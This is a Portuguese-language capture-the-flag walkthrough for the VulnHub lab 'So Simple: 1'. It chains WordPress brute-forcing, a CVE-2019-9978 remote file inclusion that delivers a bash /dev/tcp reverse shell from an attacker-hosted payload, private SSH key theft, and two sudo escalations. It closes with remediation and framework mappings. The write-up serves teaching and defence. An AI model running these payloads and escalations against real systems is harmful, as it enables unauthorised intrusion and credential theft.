# So Simple: 1 — Nunca É Realmente Simples, Né?

Bora rapaziada!! Não deixem o nome enganar. So Simple: 1 é uma corrente de exploração WordPress lindamente estruturada que empilha quatro passos distintos de escalonamento de privilégios em um único caminho de ataque limpo. CVE-2019-9978 (Social Warfare plugin RCE), chave SSH privada exposta, path traversal via `service` no sudo e um script sudo gravável inexistente. Cada passo flui naturalmente para o próximo. O designer claramente queria que você entendesse que máquinas "simples" são simples só depois que você internalizou a metodologia. Uma das melhores boxes intermediárias de WordPress no VulnHub, mano. Top demais!

| Campo | Valor |
|---|---|
| **Nível** | Fácil/Médio |
| **VM Alvo** | So Simple: 1 |
| **VM Atacante** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/so-simple-1,515/ |
| **Técnicas** | Enumeração WordPress com wpscan, brute-force de credenciais, CVE-2019-9978 Social Warfare RFI/RCE, entrega de reverse shell, extração de chave SSH privada, movimento lateral via SSH, path traversal sudo via binário `service`, exploração de script sudo gravável |
| **CVEs** | CVE-2019-9978 (Social Warfare WordPress plugin RFI/RCE, versão 3.5.0 sem patch), CWE-522 (Credenciais Insuficientemente Protegidas: chave SSH privada em caminho acessível pela web), CWE-269 (Gestão Inadequada de Privilégios: configurações incorretas de sudo) |
| **Grupos APT** | APT41: tem como alvo consistente instalações WordPress com vulnerabilidades conhecidas de plugins para acesso inicial; FIN6: usa escalonamento encadeado de configuração incorreta de sudo em hosts Linux comprometidos durante pós-exploração |

---

## Resumo do Ataque

```
nmap → porta 22 (SSH), porta 80 (HTTP WordPress)
  → gobuster: WordPress detectado
  → wpscan: usuário "max", Social Warfare plugin 3.5.0 (CVE-2019-9978)
  → wpscan brute-force: max:opensesame
  → CVE-2019-9978: RFI via endpoint swp_debug → RCE como www-data
  → /home/max/.ssh/id_rsa: chave SSH privada exposta
  → ssh -i max_key max@alvo → shell como max
  → sudo -l (como max): pode executar /usr/sbin/service como steven NOPASSWD
  → sudo -u steven /usr/sbin/service ../../bin/bash → shell como steven
  → sudo -l (como steven): pode executar /opt/tools/server-health.sh como root NOPASSWD
  → criar /opt/tools/server-health.sh → executar via sudo → uid=0(root)
  → cat /root/flag.txt
```

---

## Metodologia

1. Descoberta de host e scan completo de portas
2. Enumeração web: detectar instalação WordPress
3. Enumeração de usuários e plugins WordPress com wpscan
4. Brute-force de credenciais WordPress (wpscan + rockyou)
5. Social Warfare CVE-2019-9978: RFI para RCE como www-data
6. Recuperação de chave SSH privada de diretório home acessível pela web
7. Movimento lateral: SSH como max usando chave privada extraída
8. Abuso de sudo: max para steven via path traversal com `service`
9. Abuso de sudo: steven para root via script sudo gravável inexistente
10. Captura da flag root

---

## Passo 1 — Descoberta de Host e Scan de Portas

Identifique o alvo e enumere os serviços:

```bash
arp-scan -l
# ou: sudo netdiscover -r 192.168.56.0/24
export TARGET=192.168.56.105

nmap -sV -sC -p- $TARGET
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.x
80/tcp open  http    Apache httpd 2.4.x
```

Setup padrão de CTF com duas portas. HTTP é a superfície de ataque principal. SSH é o alvo de movimento lateral.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web e Detecção WordPress

Acesse `http://$TARGET/`. Identifique o tipo de aplicação a partir dos cabeçalhos, código-fonte e estrutura de diretórios:

```bash
curl -s http://$TARGET/ | grep -E "wp-content|wp-includes|wordpress"

gobuster dir \
  -u http://$TARGET \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 40 \
  -o /tmp/sosimple_dirs.txt
```

Instalação WordPress confirmada. Prossiga com ferramentas específicas de WordPress.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Enumeração WordPress com wpscan

Enumere usuários e plugins vulneráveis:

```bash
wpscan --url http://$TARGET --enumerate u,vp --plugins-detection aggressive
```

```
[+] WordPress versão 5.x detectado
[+] Usuário(s) identificado(s): max
[+] Social Warfare 3.5.0 é vulnerável ao CVE-2019-9978
```

Achados principais:
- Usuário: **max**
- Plugin: **Social Warfare 3.5.0** (RCE não autenticado via CVE-2019-9978)

**Nota real:** Vulnerabilidades de plugins WordPress são o vetor de acesso inicial primário para ataques em sites WordPress. O APT41 mantém um catálogo de CVEs de plugins WordPress sem patch e escaneia ativamente instalações vulneráveis em escala. O CVE-2019-9978 especificamente permite execução remota de código não autenticado via endpoint de debug do Social Warfare.

**MITRE ATT&CK:** T1595.002 — Varredura Ativa: Varredura de Vulnerabilidades; T1592 — Coletar Informações do Host da Vítima

---

## Passo 4 — Brute-Force de Credenciais WordPress

Faça brute-force da conta `max` com rockyou:

```bash
wpscan --url http://$TARGET --username max --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
```

```
[SUCESSO] Credenciais encontradas: max / opensesame
```

**Credenciais:** `max : opensesame`

**Nota:** Mesmo que o CVE-2019-9978 forneça RCE não autenticado, obter credenciais válidas fornece um caminho de acesso alternativo e confirma os achados de enumeração de usuários.

**MITRE ATT&CK:** T1110.001 — Força Bruta: Adivinhação de Senha

---

## Passo 5 — CVE-2019-9978 Social Warfare Plugin RCE

Social Warfare 3.5.0 e anteriores contêm uma vulnerabilidade RFI não autenticada no parâmetro `swp_debug`. Um arquivo remoto contendo código PHP é buscado e executado no lado do servidor.

**Configurar servidor do atacante:**

```bash
export LHOST=192.168.56.100
export LPORT=4444

# Criar payload PHP de RCE
cat > /tmp/payload.txt << 'EOF'
<pre>system('id')</pre>
EOF

# Verificar execução de código primeiro
python3 -m http.server 80 &
curl "http://$TARGET/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://$LHOST/payload.txt"
```

Se `uid=33(www-data)` aparecer na resposta, RCE está confirmado. Agora entregue um reverse shell:

```bash
# Atualizar payload para reverse shell
cat > /tmp/payload.txt << 'EOF'
<pre>system("bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'")</pre>
EOF

# Substituir placeholders pelos valores reais
sed -i "s/LHOST/$LHOST/g; s/LPORT/$LPORT/g" /tmp/payload.txt

# Iniciar listener
nc -lvnp $LPORT &

# Acionar o payload
curl "http://$TARGET/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://$LHOST/payload.txt"
```

Reverse shell recebido como `www-data`.

**Estabilizar o shell:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
# Ctrl+Z, então:
stty raw -echo; fg
```

**MITRE ATT&CK:** T1190 — Explorar Aplicação Pública; T1059.004 — Interpretador de Comandos: Unix Shell

---

## Passo 6 — Recuperação de Chave SSH Privada

A partir do shell `www-data`, investigue os diretórios home dos usuários:

```bash
ls -la /home/
ls -la /home/max/
ls -la /home/max/.ssh/

# Recuperar a chave privada
cat /home/max/.ssh/id_rsa
```

A chave SSH privada está legível por todos (uma configuração crítica incorreta). Copie para a máquina atacante:

```bash
# No atacante:
# Cole o conteúdo da chave em um arquivo local
chmod 600 /tmp/max_id_rsa
```

**Por que isso é crítico:** Uma chave SSH privada armazenada em um local legível por todos dentro de um diretório acessível pelo processo do servidor web é equivalente a uma senha em texto puro. O FIN6 especificamente enumera diretórios `.ssh/` imediatamente após o foothold inicial em sistemas Linux.

**MITRE ATT&CK:** T1552.004 — Credenciais Não Seguras: Chaves Privadas

---

## Passo 7 — Movimento Lateral para max via SSH

```bash
ssh -i /tmp/max_id_rsa max@$TARGET
```

Shell obtido como `max`. Enumere o ambiente do usuário:

```bash
whoami && id
sudo -l
ls -la /home/max/
cat /home/max/flag*.txt 2>/dev/null
```

**MITRE ATT&CK:** T1021.004 — Serviços Remotos: SSH

---

## Passo 8 — Escalonamento de Privilégios: max para steven via Path Traversal no sudo `service`

Verifique as permissões sudo de max:

```bash
sudo -l
```

```
User max may run the following commands on so-simple:
    (steven) NOPASSWD: /usr/sbin/service
```

max pode executar `/usr/sbin/service` como `steven` sem senha. O binário `service` suporta path traversal em seu primeiro argumento, permitindo execução de binários arbitrários:

```bash
sudo -u steven /usr/sbin/service ../../bin/bash
```

Isso percorre do diretório de scripts de serviço (`/etc/init.d/`) até `/`, depois resolve para `/bin/bash`, executando-o como `steven`.

Shell obtido como `steven`.

```bash
whoami
# steven
```

**Nota real:** O path traversal do binário `service` para escalonamento via sudo está catalogado no GTFOBins e aparece consistentemente em avaliações de escalonamento de privilégios Linux. A causa raiz é uma entrada sudo que concede execução de um utilitário de alto privilégio (`service`) como outro usuário sem restringir seus argumentos.

**MITRE ATT&CK:** T1548.003 — Abuso de Mecanismo de Controle de Elevação: Sudo

---

## Passo 9 — Escalonamento de Privilégios: steven para root via Script sudo Gravável

Verifique as permissões sudo de steven:

```bash
sudo -l
```

```
User steven may run the following commands on so-simple:
    (root) NOPASSWD: /opt/tools/server-health.sh
```

steven pode executar `/opt/tools/server-health.sh` como root sem senha. O arquivo ainda não existe e `/opt/tools/` pode ser criável. Isso é equivalente a acesso root irrestrito:

```bash
# Criar o diretório e o script
mkdir -p /opt/tools
cat > /opt/tools/server-health.sh << 'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /opt/tools/server-health.sh

# Executar como root
sudo /opt/tools/server-health.sh
```

Shell root obtido.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

**MITRE ATT&CK:** T1548.003 — Abuso de Mecanismo de Controle de Elevação: Sudo

---

## Passo 10 — Flag Root

```bash
cat /root/flag.txt
```

(☞ᴥ❍ʋ) Root. Caramba rapaziada, quatro passos de escalonamento em uma box só. Sensacional demais!

**MITRE ATT&CK:** T1005 — Dados do Sistema Local

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial WordPress | `max:opensesame` | Brute-force com wpscan | Acesso admin WP (caminho alternativo) |
| Chave SSH privada | (varia) | /home/max/.ssh/id_rsa | Movimento lateral SSH como max |
| Flag de usuário | (varia) | /home/*/user.txt | Prova de acesso de usuário |
| Flag root | (varia) | /root/flag.txt | Prova de comprometimento root |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Conclusão Principal |
|---|---|---|---|
| 1 | Plugin WordPress CVE-2019-9978 RCE não autenticado | Plugins sem patch são o vetor de acesso inicial #1 para ataques WordPress; Social Warfare tinha 70.000+ instalações ativas quando o CVE foi divulgado | Mantenha todos os plugins WordPress atualizados; use WPScan no CI para detectar versões vulneráveis |
| 2 | Chave SSH privada em caminho acessível pela web | Chaves SSH armazenadas com permissões frouxas permitem movimento lateral de qualquer processo com acesso de leitura ao sistema de arquivos | Armazene chaves SSH em `~/.ssh/` com modo 600; nunca em diretórios acessíveis pelo processo web |
| 3 | Sudo permite `service` sem restrição de argumento | Path traversal via `service` permite execução arbitrária de comandos como o usuário alvo | Restrinja entradas sudo a caminhos totalmente qualificados com argumentos específicos |
| 4 | Sudo permite script inexistente como root | Conceder acesso sudo a um arquivo que ainda não existe é equivalente a uma concessão de root incondicional | Apenas conceda sudo a scripts que são de propriedade de root, existem e não são graváveis pelo usuário sudo |
| 5 | Senha WordPress fraca | `opensesame` está no top 1000 do rockyou.txt | Imponha senhas fortes no WordPress; habilite autenticação de dois fatores |

---

## MITRE ATT&CK Mapeamento

| Fase | Tática | Técnica | TTP ID |
|---|---|---|---|
| Reconhecimento | Varredura Ativa | Varredura de Vulnerabilidades | T1595.002 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Pública | T1190 |
| Acesso a Credenciais | Força Bruta | Adivinhação de Senha | T1110.001 |
| Acesso a Credenciais | Credenciais Não Seguras | Chaves Privadas | T1552.004 |
| Execução | Execução | Interpretador: Unix Shell | T1059.004 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Escalonamento | Escalonamento | Abuso de Controle: Sudo | T1548.003 |
| Coleta | Coleta | Dados do Sistema Local | T1005 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Atualizar plugin Social Warfare** para 3.5.3 ou posterior; manter todos os plugins WordPress atualizados
2. **Remover chave SSH privada do caminho acessível pela web**: armazenar em `~/.ssh/id_rsa` com modo 600; garantir que o processo web não possa ler diretórios home de usuários
3. **Revogar chave SSH exposta** e gerar novo par de chaves; atualizar `~/.ssh/authorized_keys` para o usuário `max`
4. **Corrigir entrada sudo para max**: remover a entrada `service`; se movimento lateral como `steven` for necessário, usar um comando específico e restrito
5. **Corrigir entrada sudo para steven**: garantir que `/opt/tools/server-health.sh` seja de propriedade de root com modo 755 antes de conceder acesso sudo
6. **Impor senhas WordPress fortes**: mínimo de 12 caracteres; habilitar autenticação de dois fatores

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todas as instalações WordPress; rastrear versões de plugins |
| Proteger | Controle de Acesso | Permissões de armazenamento de chaves SSH; restringir entradas sudo |
| Proteger | Proteção de Software | Manter WordPress e todos os plugins com patch |
| Detectar | Anomalias e Eventos | Alertar sobre anomalias de login admin WordPress |
| Responder | Planejamento de Resposta | Revogar chaves SSH comprometidas; rotacionar credenciais WordPress |
| Recuperar | Planejamento de Recuperação | Reconstruir host comprometido; restaurar de backup limpo |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Controle de Acesso | Permissões de arquivo de chave SSH; restrições de diretório web |
| AC-6 | Menor Privilégio | Restringir entradas sudo a comandos específicos e restritos |
| CM-7 | Menor Funcionalidade | Remover plugins não utilizados; desabilitar XML-RPC se não necessário |
| IA-5 | Gestão de Autenticadores | Rotacionar chaves SSH expostas; impor senhas fortes |
| SI-2 | Remediação de Falhas | Aplicar patch em plugins WordPress dentro do SLA |
| SC-28 | Proteção de Informações em Repouso | Chaves SSH armazenadas com permissões restritivas |

### CISA KEV

CVE-2019-9978 (Social Warfare RCE) é referenciado nas diretrizes CISA sobre vulnerabilidades de plugins WordPress. O catálogo CISA Known Exploited Vulnerabilities inclui múltiplos CVEs de plugins WordPress explorados pelo APT41 e outros grupos.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL3 |
| Gestão de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gestão de Ativos (ASSET) | Gerenciar Software | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Endurecimento de Configuração de Aplicação (patch no Social Warfare; impor restrições sudo)
- **D3-OAM** — Gestão Administrativa do Sistema Operacional (auditar entradas sudo; impor permissões de chave SSH)
- **D3-UAP** — Permissões de Conta de Usuário (restringir sudo a scripts verificados de propriedade de root)

---

## Pensamentos Finais

So Simple: 1 é legitimamente uma das correntes de escalonamento mais bem projetadas no VulnHub, véi. O CVE é real, o movimento lateral via chave SSH é um cenário pós-exploração realista e o escalonamento sudo encadeado ensina você a sempre reenumerar após cada mudança de privilégio. As máquinas "simples" ensinam mais metodologia do que as "difíceis".

A lição do mundo real: um único plugin WordPress sem patch pode ser o ponto de entrada para um comprometimento completo através de configurações incorretas encadeadas. Isso não é hipotético. Isso é o cotidiano de um pentest.

Thanks guys!! (❍ᴥ❍ʋ)
